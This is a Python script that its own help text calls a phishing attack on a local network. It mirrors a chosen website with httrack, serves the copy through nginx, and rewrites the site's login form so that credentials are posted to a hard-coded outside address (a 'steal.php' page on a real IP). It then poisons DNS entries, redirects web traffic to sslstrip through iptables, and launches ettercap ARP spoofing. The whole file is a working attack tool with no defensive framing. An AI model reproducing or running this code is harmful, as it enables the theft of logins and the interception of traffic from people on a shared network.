import sys
import os
import subprocess
import shutil
import socket
import fcntl
import struct

EXECUTABLES = ['nginx', 'ettercap', 'locate', 'httrack', 'sslstrip']

def find_file(file_name):
    output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
    output_list = output.decode().split('\n')
    found = False
    conf_path = ""
    index = 0
    while not found and index < len(output_list):
        curr_line = output_list[index].rsplit('/', 1)[-1]
        if curr_line == file_name:
            conf_path = output_list[index]
            found = True
        index += 1
    if conf_path == "":
        exit(file_name + " not found on system.")
    return conf_path

def find_line(f_data):
    for i in range(len(f_data)):
        if 'location /' in f_data[i].strip() and '#' not in f_data[i]:
            return i

def update_nginx_conf(conf_path):
    try:
        with open(conf_path + '.default', 'r') as fd:
            fd_data = fd.readlines()
        fd_index = find_line(fd_data)
    except FileNotFoundError:
        fd_index = -1
        fd_path = input('Enter absolute root path for nginx server: ')
    with open(conf_path, 'r') as f:
        f_data = f.readlines()
    if fd_index != -1:
        fd_path = fd_data[fd_index+1].split()[1][:-1]
    default_path = fd_path
    fd_path += sys.argv[1].rsplit('@',1)[-1]
    index = find_line(f_data)
    index += 1
    old_f_path = f_data[index].split()[1][:-1]
    f_data[index] = f_data[index].replace(old_f_path, fd_path)
    with open(conf_path, 'w') as f:
        for l in f_data:
            f.write(l)
    return default_path

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])

def update_etter_dns(conf_path):
    ip_address = get_ip_address(sys.argv[2])
    subprocess.call(["rm",conf_path])
    new_line = sys.argv[1] + " A " + ip_address + "\n" + \
        sys.argv[1] + " PTR " + ip_address + "\n"
    if sys.argv[1].count('.') > 1:
        new_line += "*." + sys.argv[1].split('.',1)[1] + " A " + ip_address + "\n"
    with open(conf_path, 'w+') as f:
        if new_line not in f.read():
            f.write(new_line)

def update_login_page():
    website_dir = os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1]
    login_path = None
    listing = ""
    for f in os.listdir(website_dir):
        if "login" in f:
            login_path = website_dir + "/" + f
            listing += f + "\n"
            break
    if not login_path:
        print("Listing of " + website_dir + ":")
        print(listing)
        login_path = website_dir + "/" + input("Input the name of the login page from" \
            "the list above, otherwise input nothing.")
    if login_path == website_dir:
        return
    with open(login_path, 'r') as f:
        f_data = f.readlines()
    index = 0
    for i in range(len(f_data)):
        l = f_data[i]
        if "form" in l and "action" in l and "POST" in l.upper():
            index = i
            break
    split_line = f_data[index].split("\"")
    str_index = next(i for i, string in enumerate(split_line) if "action" in string)
    f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
    with open(login_path, 'w') as f:
        for l in f_data:
            f.write(l)

def call_httrack(default_path):
    os.chdir(default_path)
    subprocess.call(["rm","-f","index.html"])
    try:
        subprocess.call(["httrack","--connection-per-second=50","--sockets=80", \
            "--disable-security-limits","-A100000000","-s0","-n",sys.argv[1]])
    except KeyboardInterrupt:
        subprocess.call(["rm","hts-in_progress.lock"])
    update_login_page()
    subprocess.call(["service","nginx","restart"])
    subprocess.call(["iptables","--flush","-t","nat"])
    subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
        "80","-j","REDIRECT","--to-port","6666"])
    subprocess.Popen(["sslstrip","-w","sslstrip.log","-l","6666"], stderr=subprocess.DEVNULL)
    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])

def check_executables():
    for e in EXECUTABLES:
        path_str = shutil.which(e)
        if path_str == None:
            exit("Dependency " + e + " is not found. Please install.")

def check_root():
    if os.geteuid() != 0:
        exit("You need root privileges to run this program.")

def print_help():
    exit("This program is used as a phishing attack on the local area network (LAN).\n" \
        "USAGE: python3 dns-spoof.py <website-name> <network interface name>\n" \
        "Example of <website-name> is www.google.com, example of network interface name is eth0, wlan0.\n" \
        "DEPENDENCIES: nginx, ettercap, locate, httrack, sslstrip.\n" \
        "This program MUST be run as the ROOT user.\n" \
        "This program requires that PORTS 80 and 6666 are set as OPEN in the firewall.\n" \
        "Make sure a valid nginx.conf and etter.dns file is available on your machine.")

def main():
    try:
        if len(sys.argv) ==2 and sys.argv[1] == '-h':
            print_help()
        elif len(sys.argv) != 3:
            exit("Incorrect number of arguments, please execute with -h for details.")
        else:
            check_root()
            check_executables()
            default_nginx_path = update_nginx_conf(find_file("nginx.conf"))
            update_etter_dns(find_file("etter.dns"))
            print("Make sure ports 80 and 6666 are open in the firewall.\n")
            call_httrack(default_nginx_path)
    except KeyboardInterrupt:
        exit()


if __name__ == '__main__':
    main()
